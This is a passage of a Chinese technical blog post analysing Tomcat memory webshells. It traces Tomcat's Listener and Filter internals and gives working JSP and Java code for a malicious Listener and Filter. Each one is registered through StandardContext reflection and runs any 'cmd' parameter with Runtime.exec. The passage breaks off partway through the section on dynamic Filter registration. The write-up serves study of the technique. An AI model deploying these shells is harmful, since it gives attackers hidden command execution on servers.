class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>StandardContext#fireRequestInitEvent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br>        Object instances[] = getApplicationEventListeners();<span class="hljs-comment">//获取Listener数组</span><br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<span class="hljs-comment">//遍历触发数组内各Listener的requestInitialized方法</span><br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进第一行的<code>getApplicationEventListeners()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<span class="hljs-comment">//存储里Listener</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>    <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png" alt="image-20230201015745831"></p><p><code>StandardContext</code>也定义类添加Listener的方法,那么我们为了注册恶意Listener，就必须先获取<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-comment">// Select the Context to be used for this Request</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br></code></pre></td></tr></table></figure><p>JSP内置了request对象,因此我们可以通过反射获取</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>也可以利用类加载器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>再添加一下上面写的恶意Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">shell_Listener</span> <span class="hljs-variable">shell_listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">shell_Listener</span>();<br>  context.addApplicationEventListener(shell_listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>Listener.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>测试前，先将之前的Listener删除，先直接尝试命令执行，发现弹计算器失败，再访问一下Listener.jsp</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png" alt="image-20230201021155544"></p><p>此时Shell_Listener已经被加载进服务器，再次尝试弹计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png" alt="image-20230201021249301"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener的思路，实现一个恶意Filter。Filter的调用是通过FilterChain实现的，具体流程如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png" alt="image-20230201021445758"></p><blockquote><p>只要重写doFilter方法即可</p></blockquote><p>恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span> <span class="hljs-comment">//应用到所有路由</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png" alt="image-20230201021930234"></p><h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter(); <span class="hljs-comment">//获取Filter</span><br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<span class="hljs-comment">//* doFilter的调用</span><br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看一下获取Filter的机制，<code>filterConfig</code>是<code>filters</code>数组成员，一个<code>ApplicationFilterConfig</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//...</span><br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>跟进查看一下<code>filters</code>数组的赋值时机,在<code>StandardWrapperValve#invoke()</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>  <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">// Create the filter chain for this request</span><br>  <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><p>跟进<code>createFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>(); <span class="hljs-comment">//创建一个空的filterChain</span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<span class="hljs-comment">//得到StandardContext</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<span class="hljs-comment">//获取其中的FilterMaps,里面存储里各Filter的信息</span><br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<span class="hljs-comment">//获取名称</span><br> <br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="hljs-comment">//遍历得到对应FilterConfig</span><br>            <span class="hljs-comment">//...</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-comment">//...</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> filterChain;<span class="hljs-comment">//将获取到的ApplicationFilterConfig整合返回</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#addFilter</code>看一下添加机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>        <span class="hljs-comment">//防止重复添加</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="Filter动态注册"><a href="#Filter动态注册" class="headerlink" title="Filter动态注册"></a>Filter动态注册</h4><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>这里先说一个前提条件，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ol><li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li><li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</li><li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）。</li></ol><p>这里只讨论第一种，并先关注比较重要的addFilter方法</p><p>在<code>ServletContext</code>接口中有声明了3个<code>addFilter</code>方法，其实现在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。这里以Tomcat 10.0.23为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName,</span><br><span class="hljs-params">        String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<span class="hljs-comment">//filterName不能为空</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<br>                <span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>  <span class="hljs-comment">//这里的context是StandardContext类型</span><br>    <span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="hljs-comment">//判断context的state是否是程序刚启动的state</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>,<br>                        getContextPath()));<br>    &#125;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<span class="hljs-comment">//在context中根据 filterName 寻找FilterDef对象</span><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp;<br>                filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//将Filter对象放入FilterDef中</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="hljs-comment">//包装FilterDef和context返回</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从传参可以看出filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>,动调一下会发现其实filterClass、filterName对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><blockquote><p>并且可以发现<code>ApplicationContext </code>的 <code>addFilter</code> 中将 filter 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中,但我们之前分析的<code>FilterChain</code>中的Filter是在<code>StandardContext</code>的<code>filterMaps</code>里获取</p><p>这里可以跟进看一下Filter是怎么被添加到其他参数中的</p></blockquote><p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 